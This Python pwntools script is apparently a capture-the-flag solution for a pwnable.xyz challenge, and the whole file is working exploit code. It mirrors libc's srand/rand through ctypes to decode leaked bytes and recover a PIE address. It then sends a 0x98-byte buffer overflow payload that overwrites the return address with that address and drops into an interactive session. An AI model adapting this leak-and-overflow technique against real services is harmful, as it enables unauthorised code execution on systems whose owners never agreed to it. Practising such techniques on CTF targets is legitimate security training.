from pwn import *
import ctypes
context.log_level='DEBUG'
while(True):
	#target=process('./challenge')
	target=remote('svc.pwnable.xyz',30040)
	lib=ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
	mapp=[]

	for i in range(0x100):
		lib.srand(i)
		mapp.append(int(hex(lib.rand())[-2:],16))

	def init(option):
		(target.recvuntil("> "))
		target.sendline(str(option))
		
	def seed():
		init(1)

	def encrypt():
		init(2)
		(target.recvuntil(": "))
		target.sendline("\x01")
		
	def leak():
		init(3)
		(target.recvuntil(": "))
		leaks=int(hex((u8(target.recvn(1)[0])+0xff)%0x100),16)
		return leaks


	def getindex(val):
		return (val%8)

	def REVLEAK(val):
		pos=-1
		for i in range(0x100):
			if(mapp[i]==val):
				pos=(p8(i))
				break
		return pos

	def REVLEAK1(val):
		pos=-1
		for i in range(0x100):
			if(mapp[i]==val and i%0x10==0xa):
				pos=(p8(i))
				break
		return pos

	LEAKARR=["\xd6","\x00","\x00","\x00","\x00","\x55"]
	DONE=[1,0,0,0,0,1,1,1]
	CHECK=4
	lib.srand(0)

	while(CHECK!=8):
		while(True):
			RANDVAL=lib.rand()
			index=getindex(RANDVAL)
			if(DONE[index]==1):
				encrypt()
				continue
			break
		seed()
		encrypt()
		leaks=leak()
		if(index==1):
			pos=REVLEAK1(leaks)
		else:
			pos=REVLEAK(leaks)
			
	
		LEAKARR[index]=pos
		DONE[index]=1
		CHECK+=1
		lib.srand(u8(pos))
		lib.rand()
			

	RANDVAL=lib.rand()%0x100
	print(hex(RANDVAL))
	PIE_WIN=""
	PIE_WINr=""
	for p in LEAKARR:
		PIE_WINr+=p
		PIE_WIN+=p8(int(hex((u8(p)+0x100-RANDVAL)%0x100),16))

	print(hex(u64(PIE_WINr.ljust(8,"\x00"))))
	print(hex(u64(PIE_WIN.ljust(8,"\x00"))))
	init(2)
	target.recvuntil(": ")
	payload="A"*0x98+PIE_WIN
	target.sendline(payload)
	init(0)
	target.interactive()
